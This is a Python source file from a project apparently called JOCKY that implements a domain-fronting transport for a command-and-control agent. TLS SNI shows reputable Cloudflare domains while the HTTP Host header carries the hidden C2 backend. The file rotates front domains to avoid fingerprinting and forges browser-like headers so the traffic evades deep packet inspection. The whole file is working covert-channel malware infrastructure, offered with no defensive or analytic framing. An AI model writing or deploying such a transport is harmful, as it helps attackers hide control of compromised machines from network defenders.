# transport/domain_fronting.py
# [JOCKY phase 14 -- TLS 1.3 domain fronting transport]
#
# PURPOSE
# -------
# Implements domain fronting over Cloudflare CDN:
#   SNI  (TLS ClientHello): a benign high-reputation Cloudflare customer
#   Host (HTTP header):     the actual JOCKY C2 backend domain
#
# The CDN terminates TLS using the SNI domain's cert, then forwards
# the request to the Host header's origin. Deep packet inspection sees
# only the SNI domain — a legitimate business's traffic.
#
# MECHANISM
# ---------
# 1. TCP connect to Cloudflare anycast IP (resolved from SNI domain)
# 2. TLS handshake with server_hostname = SNI_DOMAIN (triggers CDN cert)
# 3. HTTP/1.1 request with Host: C2_BACKEND_DOMAIN
# 4. Cloudflare routes to C2 based on Host header, not SNI
#
# WIRE FORMAT
# -----------
# All traffic looks like:
#   TLS 1.3 to *.cloudflare.com (or any CDN customer domain)
#   HTTP/1.1 GET /api/v2/files/{session_id} HTTP/1.1
#   Host: {c2_backend}
#   Content-Type: application/json
#   Authorization: Bearer {token}
#
# *the packet inspector sees Cloudflare. the C2 sees the agent.
#  the two never appear in the same field of the same packet.*

import ssl
import socket
import json
import time
import hashlib
import hmac
import os
import base64
import struct
import threading
import logging
from typing import Optional, Dict, Any, Tuple

logger = logging.getLogger("jocky.transport.fronting")


# ── CDN front domains (high-reputation Cloudflare customers) ─────────────────
# these are the domains used in SNI — traffic appears to come FROM these
# swap these per deployment to avoid static fingerprinting
CDN_FRONTS = [
    "www.cloudflare.com",
    "cdnjs.cloudflare.com",
    "ajax.cloudflare.com",
]

# ── TLS configuration ─────────────────────────────────────────────────────────
TLS_MIN_VERSION    = ssl.TLSVersion.TLSv1_3
CONNECT_TIMEOUT    = 10.0   # seconds
READ_TIMEOUT       = 30.0
MAX_RESPONSE_BYTES = 65536  # 64 KB max response


class FrontedSession:
    """
    A single domain-fronted HTTPS session.
    Maintains one TLS socket per instance — not thread-safe.
    Create one per agent thread.
    """

    def __init__(self,
                 c2_backend: str,
                 sni_front:  str,
                 cdn_ip:     Optional[str] = None,
                 port:       int           = 443):
        """
        c2_backend:  Host header value — actual C2 domain, e.g. "c2.example.com"
        sni_front:   SNI value — what DPI sees, e.g. "cdnjs.cloudflare.com"
        cdn_ip:      optional fixed IP (resolved from sni_front if None)
        port:        HTTPS port (443)

        *the session knows two names for the same door —
         one it shows the world, one it whispers to the lock*
        """
        self.c2_backend  = c2_backend
        self.sni_front   = sni_front
        self.port        = port
        self._cdn_ip     = cdn_ip
        self._sock: Optional[ssl.SSLSocket] = None
        self._lock       = threading.Lock()

        # build TLS context — verify against SNI front's cert
        self._ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self._ctx.minimum_version     = TLS_MIN_VERSION
        self._ctx.check_hostname      = True
        self._ctx.verify_mode         = ssl.CERT_REQUIRED
        self._ctx.load_default_certs()

        # remove weak ciphers — TLS 1.3 only, no TLS 1.2 fallback
        self._ctx.set_ciphers(
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256"
        )

    def _resolve_cdn_ip(self) -> str:
        """resolve SNI front domain to IP — this is the IP we TCP-connect to"""
        if self._cdn_ip:
            return self._cdn_ip
        infos = socket.getaddrinfo(self.sni_front, self.port,
                                   socket.AF_INET, socket.SOCK_STREAM)
        if not infos:
            raise ConnectionError(f"DNS resolution failed: {self.sni_front}")
        ip = infos[0][4][0]
        logger.debug(f"fronting: {self.sni_front} -> {ip}")
        return ip

    def connect(self) -> None:
        """
        Establish the fronted TLS session.
        TCP to CDN IP, TLS SNI = sni_front, Host header = c2_backend.
        """
        cdn_ip = self._resolve_cdn_ip()

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(CONNECT_TIMEOUT)
        raw.connect((cdn_ip, self.port))

        # wrap with TLS — server_hostname drives SNI in ClientHello
        # CDN terminates TLS with sni_front's cert (what DPI sees)
        # then forwards HTTP to c2_backend based on Host header
        self._sock = self._ctx.wrap_socket(
            raw,
            server_hostname=self.sni_front  # ← SNI: what the network sees
        )
        self._sock.settimeout(READ_TIMEOUT)

        tls_ver = self._sock.version()
        cipher  = self._sock.cipher()
        logger.info(f"fronted session: TLS={tls_ver} cipher={cipher[0]} "
                    f"sni={self.sni_front} c2={self.c2_backend}")

    def request(self,
                method:  str,
                path:    str,
                body:    Optional[bytes]     = None,
                headers: Optional[Dict[str,str]] = None) -> Tuple[int, bytes]:
        """
        Send an HTTP/1.1 request over the fronted TLS session.
        Returns (status_code, response_body).

        The Host header carries c2_backend — CDN routes based on this.
        All other headers are crafted to look like normal API client traffic.
        """
        if not self._sock:
            self.connect()

        hdr = {
            "Host":            self.c2_backend,   # ← real destination
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
            "Cache-Control":   "no-cache",
        }
        if body:
            hdr["Content-Length"] = str(len(body))
            hdr["Content-Type"]   = "application/json"
        if headers:
            hdr.update(headers)

        # build raw HTTP request
        req_lines = [f"{method} {path} HTTP/1.1"]
        for k, v in hdr.items():
            req_lines.append(f"{k}: {v}")
        req_lines.append("")
        req_lines.append("")
        raw_req = "\r\n".join(req_lines).encode("utf-8")
        if body:
            raw_req = raw_req[:-2] + body  # replace trailing CRLF before body

        self._sock.sendall(raw_req)
        return self._recv_response()

    def _recv_response(self) -> Tuple[int, bytes]:
        """read HTTP/1.1 response -- handles chunked and content-length"""
        # read headers
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = self._sock.recv(4096)
            if not chunk:
                break
            raw += chunk
            if len(raw) > MAX_RESPONSE_BYTES:
                raise ValueError("response headers too large")

        header_raw, _, body_start = raw.partition(b"\r\n\r\n")
        lines  = header_raw.decode("utf-8", errors="replace").split("\r\n")
        status = int(lines[0].split(" ")[1])

        hdrs: Dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                hdrs[k.strip().lower()] = v.strip()

        # read body
        body = body_start
        if "content-length" in hdrs:
            need = int(hdrs["content-length"]) - len(body_start)
            while need > 0:
                chunk = self._sock.recv(min(need, 4096))
                if not chunk:
                    break
                body += chunk
                need -= len(chunk)
        elif hdrs.get("transfer-encoding") == "chunked":
            body = self._read_chunked(body_start)

        return status, body

    def _read_chunked(self, initial: bytes) -> bytes:
        buf = initial
        out = b""
        while True:
            while b"\r\n" not in buf:
                buf += self._sock.recv(4096)
            size_line, _, buf = buf.partition(b"\r\n")
            chunk_size = int(size_line.split(b";")[0], 16)
            if chunk_size == 0:
                break
            while len(buf) < chunk_size + 2:
                buf += self._sock.recv(4096)
            out += buf[:chunk_size]
            buf  = buf[chunk_size + 2:]
        return out

    def close(self) -> None:
        if self._sock:
            try: self._sock.close()
            except Exception: pass
            self._sock = None


class FrontingPool:
    """
    Thread-safe pool of FrontedSession instances.
    Rotates SNI front domains to avoid static fingerprinting.
    Called by JockyTransport — do not use directly.
    """

    def __init__(self, c2_backend: str, fronts: list = None):
        self.c2_backend = c2_backend
        self.fronts     = fronts or CDN_FRONTS
        self._sessions: Dict[str, FrontedSession] = {}
        self._lock      = threading.Lock()
        self._front_idx = 0

    def _next_front(self) -> str:
        """round-robin front domain selection"""
        with self._lock:
            f = self.fronts[self._front_idx % len(self.fronts)]
            self._front_idx += 1
            return f

    def get_session(self, thread_id: Optional[str] = None) -> FrontedSession:
        """get or create a session for this thread"""
        tid = thread_id or str(threading.current_thread().ident)
        with self._lock:
            if tid not in self._sessions:
                front = self._next_front()
                sess = FrontedSession(self.c2_backend, front)
                sess.connect()
                self._sessions[tid] = sess
        return self._sessions[tid]

    def invalidate(self, thread_id: Optional[str] = None) -> None:
        """drop a bad session so next call reconnects"""
        tid = thread_id or str(threading.current_thread().ident)
        with self._lock:
            if tid in self._sessions:
                self._sessions[tid].close()
                del self._sessions[tid]

    def close_all(self) -> None:
        with self._lock:
            for s in self._sessions.values():
                s.close()
            self._sessions.clear()